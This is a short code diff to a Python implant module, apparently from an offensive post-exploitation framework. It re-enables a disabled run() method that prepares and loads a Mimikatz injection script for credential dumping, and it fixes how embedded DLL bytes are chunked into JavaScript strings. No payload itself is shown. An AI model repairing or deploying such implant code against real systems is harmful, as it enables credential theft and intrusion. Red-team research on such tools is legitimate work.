@@ -93,17 +93,18 @@ class DotNet2JSImplant(core.implant.Implant):
             index = 0
             ret = '"';
             for c in text:
-                ret += c
+                ret += str(c)
                 index += 1
-                if index % 20 == 0:
+                if index % 100 == 0:
                     ret += '"+\r\n"'
 
             ret += '";'
-            print(ret)
+            # print(ret)
+            return ret
 
     def run(self):
-        self.shell.print_error("Plugin is busted. See GitHub issue #1.")
-        return
+        # self.shell.print_error("Plugin is busted. See GitHub issue #1.")
+        # return
 
         import uuid
         self.options.set("DLLUUID", uuid.uuid4().hex)
@@ -113,7 +114,7 @@ class DotNet2JSImplant(core.implant.Implant):
         self.options.set("MIMIX86UUID", uuid.uuid4().hex)
 
 
-        self.options.set("SHIMX86BYTES", self.dllb64(self.options.get("SHIMX86DLL")))
+        self.options.set("SHIMX86B64", self.dllb64(self.options.get("SHIMX86DLL")))
 
         workloads = {}
         workloads["js"] = self.loader.load_script("data/implant/inject/mimikatz_dotnet2js.js", self.options)
